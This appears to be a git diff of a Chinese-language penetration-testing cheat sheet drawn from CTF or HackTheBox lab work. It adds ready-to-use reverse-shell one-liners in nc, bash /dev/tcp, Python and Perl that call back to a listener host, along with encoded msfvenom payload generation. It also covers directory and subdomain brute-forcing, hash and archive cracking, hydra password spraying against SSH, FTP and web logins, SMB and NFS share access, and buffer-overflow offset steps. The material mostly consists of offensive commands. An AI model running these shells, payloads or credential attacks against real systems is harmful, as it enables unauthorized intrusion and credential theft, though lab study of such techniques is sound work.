@@ -63,21 +63,47 @@ script -qc /bin/bash /dev/null
 
 script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。
 
-### 获得 shell 的一些 反弹 shell
+### 反弹 shell
 
 #### Linux
 
+##### 现成的反弹 shell
+
 ```shell
 nc -e /bin/bash 10.10.10.5 4444
+```
 
+```
 bash -c "/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"
+```
 
+```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
 
+```
 perl -e 'use Socket;$i="10.10.10.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-### 文件属性和可识别字符
+##### Msfvenom
+
+Msf 生成反弹 shell
+
+```
+sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
+```
+
+生成二进制脚本
+
+```
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c
+```
+
+```
+sudo msfvenom -p linux/x86/exec CMD="/bin/bash" -b "\x00" -e x86/shikata_ga_nai -f c
+```
+
+### 文件分析
 
 在拿到一个文件后可进行如下分析：
 
@@ -101,8 +127,6 @@ file 命令是识别文件类型和格式，通过分析文件头信息等数据
 
 strings 默认情况下会从文件中连续提取长度大于等于 4 的字符（可通过 -n 参数调整），且属于 ASCII 可打印字符序列，其他非打印字符被忽略。在渗透测试中， string 的使用场景及其广泛，例如：渗透测试时拿到了一个可疑的 ELF 文件，运行 strings 可以快速发现硬编码的密码、域名、文件路径等敏感信息，帮助快速判断下一步攻击路径；对未知为文件快速扫描，也可以快速提取潜在可读信息，提升分析效率。
 
-
-
 ### 将文件从 ssh 中拿出
 
 以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。
@@ -125,7 +149,7 @@ trans（translate-shell）是很不错的命令行翻译工具。
 
 IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是一种常见的访问控制漏洞，主要出现在 Web 应用请求的资源未进行有效的权限验证和限制的情况下。具体来说，应用程序通过用户提交的参数（如用户ID、文件名、订单号等）直接引用内部对象，却未验证当前用户是否拥有访问这些对象的权限。这种情况下，攻击者可以通过修改请求的参数值（例如 ID 号）直接访问或操作本不该被访问到的敏感信息或资源，从而实现越权访问。例如，在一个用户个人信息页面中，如果 URL 参数形如 user?id=1，攻击者只需要修改 id 值即可查看其他用户的数据。当开发者未对资源引用和权限做严格验证时，IDOR 漏洞便会产生，攻击者通过简单篡改请求参数即可实现攻击。
 
-### 关于文件上传
+### 文件上传
 
 有些表单原本只可以上传 jpg、git、png 等图片格式文件，为什么最终却可以上传 .phtml 和 .phar 格式文件呢？因为 .phtml 和 .phar 两种文件格式比较特殊，.phtml 是一种 PHP 常规拓展名，早期较为常见，现在虽然使用较少但依旧默认会被 PHP 引擎解析，这使得攻击者能够通过上传该格式的文件直接执行恶意 PHP 代码。而 .phar 更加特殊，它本质上是 PHP 的归档文件格式（PHP Archive），也可以执行。
 
@@ -150,4 +174,232 @@ ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-值得注意的是，下载 `id_rsa` 是失败的，需要下载 `id_ed25519`；`id_ed25519` 是现代 SSH 推荐的 Ed25519 算法私钥文件。
+值得注意的是，下载 `id_rsa` 是失败的，需要下载 `id_ed25519`；`id_ed25519` 是现代 SSH 推荐的 `Ed25519` 算法私钥文件。
+
+### 爆破相关
+
+#### 目录爆破
+
+##### Dirb
+
+```bash
+sudo dirb https://10.10.10.10
+```
+
+##### Gobuster
+
+```bash
+sudo gobuster dir -u http://api.mentorquotes.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php.bak,jsp,zip,tar,html,txt,tar,tar.gz,git,js,md
+```
+
+POST 爆破
+
+```bash
+sudo gobuster dir -u http://driver.htb -U admin -P admin -x php -w /usr/share/wordlists/dirb/common.txt
+```
+
+##### Feroxbuster
+
+```bash
+sudo feroxbuster -u http://driver.htb -x php -H "Authorization: Basic YWRtaW46YWRtaW4=" 
+```
+
+##### Ffuf
+
+```bash
+sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.230.159:3000/?FUZZ=value -fs 81
+```
+
+#### 关于子域名爆破
+
+##### Gobuster
+
+```bash
+sudo gobuster vhost -u http://10.129.230.193 --domain crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k -r -t 100
+```
+
+- vhost：指定虚拟主机枚举模式
+- --domain：指定基础域名
+- -k：跳过 `SSL/TLS` 证书验证
+- -r：自动跟随重定向
+- -t 100：设置并发线程为 100
+
+#### Ffuf
+
+```bash
+sudo ffuf -H "Host: FUZZ.soulmate.htb" -u http://soulmate.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
+```
+
+- -H：添加自定义 `HTTP` 请求头
+- Host: FUZZ.soulmate.htb：设置 `Host` 头部
+- FUZZ：`ffuf` 的关键占位符
+- -ac：自动校准模式
+
+#### 暴力破解
+
+##### Hashcat
+
+破解 `MD5`
+
+```bash
+sudo hashcat -m 0 -a 0 hash/hash.lst /usr/share/wordlists/rockyou.txt
+```
+
+破解 `7z`
+
+```bash
+sudo hashcat -m 11600 -a 0 7z_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+查看破解过的 `hash`
+
+```bash
+sudo hashcat -m 0 --show hash/hash.lst
+```
+
+##### Hydra
+
+破解多个用户
+
+```bash
+sudo hydra -L users.txt -P wordlist.txt
+```
+
+破解单个用户
+
+```bash
+sudo hydra -l "aaa" -P wordlist.txt
+```
+
+破解 Web POST
+
+```bash
+sudo hydra -l "key" -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
+```
+
+FTP 密码喷射
+
+```bash
+sudo hydra -L hash/users.lst -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.35 -f
+```
+
+SSH 密码喷射
+
+```bash
+hydra -l sword -P passwords.txt ssh://10.10.10.5 -t 30 -V
+```
+
+破解登入框
+
+```bash
+sudo hydra -l shaldon -P password.txt -f 10.10.10.39 -s 80 http-get /the_real_secret_dir
+```
+
+##### Ffuf
+
+破解 Web POST
+
+```bash
+sudo wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 404,401 -d "username=admin&password=FUZZ" http://driver.htb
+```
+
+##### John
+
+破解 `hash`
+
+```bash
+sudo john hash/hash.lst --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+破解 `id_rsa`
+
+```bash
+/usr/share/john/ssh2john.py hash/id_rsa > crack.txt  
+```
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa     
+```
+
+破解 7z
+
+```
+/usr/share/john/7z2john.py backup.7z > 7z_hash.txt
+```
+
+```
+john 7z_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+破解 zip
+
+```
+sudo /usr/sbin/zip2john flag.zip > flag.txt
+```
+
+```
+john flag.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+生成更好的字典
+
+```
+john -rules -wordlist=password.txt - stdout | sort | uniq > wordlist.txt
+```
+
+### 共享目录相关
+
+#### Mount
+
+检查共享目录
+
+```bash
+showmount -e 10.10.10.13
+```
+
+连接共享目录
+
+```bash
+sudo mount -t nfs 10.10.10.13:/home/karl attact
+```
+
+#### Smbclient
+
+列出 SMB 共享
+
+```
+sudo smbclient -N -L \\\\10.10.10.10
+```
+
+连接到 SMB 共享
+
+```
+sudo smbclient \\\\10.10.10.10\\enil
+```
+
+### 缓冲区溢出
+
+#### Msf
+
+创建 600 字节缓冲区
+
+```
+msf-pattern_crate -l 600
+```
+
+确定字节
+
+```
+msf-pattern_offset -l 600 -q 35724134
+```
+
+jum esp
+
+```
+msf-nasm_shell
+```
+
+```
+jmp esp
+```
+
